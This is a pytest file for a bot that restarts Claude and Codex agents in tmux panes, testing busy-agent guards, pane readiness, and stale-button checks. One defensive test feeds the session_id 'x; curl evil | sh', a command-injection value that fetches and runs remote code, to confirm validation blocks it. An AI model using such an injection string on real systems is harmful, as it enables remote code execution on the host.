"""Tests for callback handlers — agent-panel restart guard.

The tmux restart types /exit + the relaunch command into the pane; on a
busy agent both would land in Claude's prompt as user text and the
"restarted" success check would still pass (the process never exited).
The guard refuses with an alert instead.
"""

from __future__ import annotations

import asyncio

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from ccbot.handlers.callbacks import _restart_agent, _wait_pane_ready


@pytest.fixture
def query():
    q = MagicMock()
    q.answer = AsyncMock()
    return q


class TestWaitPaneReady:
    """After a kill+relaunch the panel must screenshot only once Claude's
    input box has rendered — never the black boot frame, and never hang."""

    @pytest.mark.asyncio
    async def test_returns_once_input_box_renders(self):
        ready = "❯ \n" + "─" * 100 + "\n"
        # First poll: still booting (empty). Second: input box drawn.
        cap = AsyncMock(side_effect=["", ready])
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.asyncio.sleep", new=AsyncMock()),
        ):
            sm.capture_pane = cap
            await _wait_pane_ready("docker:assistant", timeout=5.0)
        assert cap.await_count == 2

    @pytest.mark.asyncio
    async def test_times_out_without_hanging(self, monkeypatch):
        # Pane never renders an input box → must give up at the deadline
        # (and fall through to screenshot whatever's there), not loop forever.
        clock = {"t": 0.0}
        monkeypatch.setattr(
            "ccbot.handlers.callbacks.time.monotonic", lambda: clock["t"]
        )

        async def _tick(_):
            clock["t"] += 1.0

        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.asyncio.sleep", new=_tick),
        ):
            sm.capture_pane = AsyncMock(return_value="loading...\n")
            await _wait_pane_ready("docker:assistant", timeout=3.0)
        # Bounded: stopped at the deadline rather than spinning.
        assert sm.capture_pane.await_count <= 4


class TestRestartBusyGuard:
    @pytest.mark.asyncio
    async def test_busy_tmux_agent_refused_with_alert(self, query):
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
        ):
            sm._is_docker_binding.return_value = False
            # Runtime-aware busy check now lives on session_manager (dispatches
            # by WindowState.runtime); True = agent mid-turn → refuse.
            sm.is_agent_working.return_value = True
            sm.get_window_state.return_value = MagicMock(session_id="sid")
            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
            tm.capture_pane = AsyncMock(return_value="✻ Cooking… (esc to interrupt)")
            tm.send_keys = AsyncMock()

            await _restart_agent(query, "@5", fresh=False)

            tm.send_keys.assert_not_called()
            assert query.answer.await_count == 1
            assert query.answer.await_args.kwargs.get("show_alert") is True

    @pytest.mark.asyncio
    async def test_idle_tmux_agent_restarts(self, query, monkeypatch):
        async def _no_sleep(_):
            return None

        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
            # launch_command / exit_command read config from ccbot.runtimes.
            patch("ccbot.runtimes.config") as rcfg,
            patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
        ):
            rcfg.claude_command = "claude"
            sm._is_docker_binding.return_value = False
            sm.is_agent_working.return_value = False
            sm.get_window_state.return_value = MagicMock(
                session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
            )
            tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
            tm.capture_pane = AsyncMock(return_value="❯ ")
            tm.send_keys = AsyncMock()
            # _wait_pane_ready polls session_manager.capture_pane until the
            # input box (chrome separator) renders — return a ready pane so it
            # returns on the first poll instead of looping to its timeout.
            sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")

            await _restart_agent(query, "@5", fresh=False)

            sent = [c.args[1] for c in tm.send_keys.await_args_list]
            # Restart now goes through the runtime's exit + launch commands
            # (claude: /exit → `claude --name … --resume …`), consistent with
            # create_window.
            assert sent == [
                "/exit",
                "claude --name proj --resume 11111111-2222-3333-4444-555555555555",
            ]

    async def test_malformed_session_id_starts_fresh_no_injection(
        self, query, monkeypatch
    ):
        """A shell-metachar session_id must NOT reach the relaunch command.

        Guards audit HIGH#1: session_id is typed into the pane's shell after
        /exit, so an unvalidated value would be command injection on the host.
        """

        async def _no_sleep(_):
            return None

        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
            patch("ccbot.runtimes.config") as rcfg,
            patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
        ):
            rcfg.claude_command = "claude"
            sm._is_docker_binding.return_value = False
            sm.is_agent_working.return_value = False
            sm.get_window_state.return_value = MagicMock(
                session_id="x; curl evil | sh", runtime="claude"
            )
            tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
            tm.capture_pane = AsyncMock(return_value="❯ ")
            tm.send_keys = AsyncMock()
            sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")

            await _restart_agent(query, "@5", fresh=False)

            sent = [c.args[1] for c in tm.send_keys.await_args_list]
            # launch_command validates the id (is_valid_session_id) — no --resume
            # appended, so the payload never reaches the shell line.
            assert sent == ["/exit", "claude --name proj"]
            assert all("curl evil" not in s for s in sent)

    @pytest.mark.asyncio
    async def test_codex_tmux_agent_restarts_with_quit_and_resume(
        self, query, monkeypatch
    ):
        """A codex window restarts via its own exit (/quit) + resume (codex
        resume <id>), not claude's /exit + `claude --resume`."""

        async def _no_sleep(_):
            return None

        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
            patch("ccbot.runtimes.config") as rcfg,
            patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
        ):
            rcfg.codex_command = "codex"
            rcfg.codex_bypass_sandbox = False
            sm._is_docker_binding.return_value = False
            sm.is_agent_working.return_value = False
            sm.get_window_state.return_value = MagicMock(
                session_id="019f0000-0000-7000-8000-000000000000", runtime="codex"
            )
            tm.find_window_by_id = AsyncMock(
                return_value=MagicMock(window_name="myproject")
            )
            tm.capture_pane = AsyncMock(return_value="› ")
            tm.send_keys = AsyncMock()
            sm.capture_pane = AsyncMock(return_value="› \n" + "─" * 100 + "\n")

            await _restart_agent(query, "@9", fresh=False)

            sent = [c.args[1] for c in tm.send_keys.await_args_list]
            assert sent == [
                "/quit",
                "codex resume 019f0000-0000-7000-8000-000000000000",
            ]


class TestGuardedWid:
    """_guarded_wid must recover the window_id from every guarded payload
    shape — including docker binding values, whose id embeds a colon."""

    def test_simple_tmux(self):
        from ccbot.handlers.callbacks import _guarded_wid

        assert _guarded_wid("cm:clear:@5") == "@5"
        assert _guarded_wid("aq:enter:@12") == "@12"
        assert _guarded_wid("ss:ref:@0") == "@0"
        assert _guarded_wid("wt:del:@3") == "@3"

    def test_simple_docker(self):
        from ccbot.handlers.callbacks import _guarded_wid

        assert _guarded_wid("cm:kill:docker:assistant") == "docker:assistant"
        assert _guarded_wid("aq:up:docker:assistant") == "docker:assistant"

    def test_one_field_shapes(self):
        from ccbot.handlers.callbacks import _guarded_wid

        assert _guarded_wid("kb:esc:@5") == "@5"
        assert _guarded_wid("cm:tab:ses:@5") == "@5"
        assert _guarded_wid("cm:ref:act:docker:assistant") == "docker:assistant"
        assert _guarded_wid("cm:cfm:clear:@7") == "@7"

    def test_unguarded_payloads_pass(self):
        from ccbot.handlers.callbacks import _guarded_wid

        assert _guarded_wid("cm:can:act:@5") is None  # cancel: repaint-only
        assert _guarded_wid("db:sel:3") is None
        assert _guarded_wid("rs:new") is None
        assert _guarded_wid("hp:0:@5:0:100") is None


class TestStalePanelGuard:
    """A tap on a panel whose window_id no longer matches the topic's
    binding must be refused — tmux ids are recycled across restarts, so
    the old button could otherwise /clear a different project's agent."""

    def _update(self, data: str):
        update = MagicMock()
        query = MagicMock()
        query.data = data
        query.answer = AsyncMock()
        query.edit_message_reply_markup = AsyncMock()
        update.callback_query = query
        update.effective_user = MagicMock()
        update.effective_user.id = 1
        update.effective_chat = MagicMock()
        update.effective_chat.type = "supergroup"
        update.effective_chat.id = -100123
        update.effective_message = MagicMock()
        update.effective_message.message_thread_id = 42
        update.effective_message.is_topic_message = True
        return update, query

    @pytest.mark.asyncio
    async def test_mismatched_wid_is_blocked(self):
        from ccbot.handlers.callbacks import callback_handler

        update, query = self._update("cm:clear:@5")
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.config") as cfg,
        ):
            cfg.is_user_allowed.return_value = True
            sm.resolve_window_for_thread.return_value = "@9"  # rebound elsewhere
            await callback_handler(update, MagicMock())
        query.answer.assert_awaited_once()
        assert query.answer.await_args.kwargs.get("show_alert") is True
        query.edit_message_reply_markup.assert_awaited_once_with(reply_markup=None)

    @pytest.mark.asyncio
    async def test_matching_wid_dispatches(self):
        # _PREFIX_DISPATCH holds direct function refs (bound at import), so
        # the handler can't be patched away — instead assert the guard did
        # NOT fire: no stale alert, no keyboard disarm (reply_markup=None).
        from ccbot.handlers.callbacks import callback_handler

        update, query = self._update("cm:tab:act:@5")
        with (
            patch("ccbot.handlers.callbacks.session_manager") as sm,
            patch("ccbot.handlers.callbacks.config") as cfg,
        ):
            cfg.is_user_allowed.return_value = True
            sm.resolve_window_for_thread.return_value = "@5"
            sm.get_display_name.return_value = "proj"
            await callback_handler(update, MagicMock())
        disarms = [
            c
            for c in query.edit_message_reply_markup.await_args_list
            if c.kwargs.get("reply_markup") is None
        ]
        assert not disarms
        alerts = [c for c in query.answer.await_args_list if c.kwargs.get("show_alert")]
        assert not alerts
